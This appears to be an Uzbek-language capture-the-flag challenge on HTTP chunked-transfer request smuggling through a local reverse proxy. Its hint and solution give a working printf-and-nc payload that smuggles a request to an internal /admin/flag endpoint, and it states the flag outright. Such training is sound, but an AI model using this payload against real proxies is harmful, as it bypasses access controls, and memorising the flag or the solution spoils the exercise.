---
id: 28
title: "CH28: HTTP Chunked Transfer Smuggling"
module: "Modul 3: Streams, FIFO & Sockets"
difficulty: Hard
points: 9
tags: ['http', 'smuggling', 'proxy', 'web-security']
flag: "HD{http_chunked_smuggling_proxy_bypass_928}"
---

# 🎯 Topshiriq #28: CH28: HTTP Chunked Transfer Smuggling

## 📌 Metama'lumotlar:
* **Modul:** `Modul 3: Streams, FIFO & Sockets`
* **Qiyinlik darajasi:** `🔴 Hard`
* **Maksimal Ball:** `⭐ 9 ball`
* **Teglar:** #http, #smuggling, #proxy, #web-security

---

## 📝 Topshiriq Senariysi (Scenario):
Lokal reverse proxy va backend orasida Transfer-Encoding: chunked parsing zaifligi mavjud. Soxta chunked paket orqali ichki /admin/flag API endpointini chaqiring.

---

## 💡 Kichik Maslahat (Hint):
> [!TIP]
> printf 'POST / HTTP/1.1\r\nHost: localhost\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin/flag HTTP/1.1\r\n\r\n' | nc 127.0.0.1 80

---

## 🛠️ Professional Yechim Ko'rsatmasi:
```bash
# Topshiriqni yechish bo'yicha ko'rsatma:
printf 'POST / HTTP/1.1\r\nHost: localhost\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin/flag HTTP/1.1\r\n\r\n' | nc 127.0.0.1 80
```

---

## 🚩 Maxfiy Flag:
`HD{http_chunked_smuggling_proxy_bypass_928}`
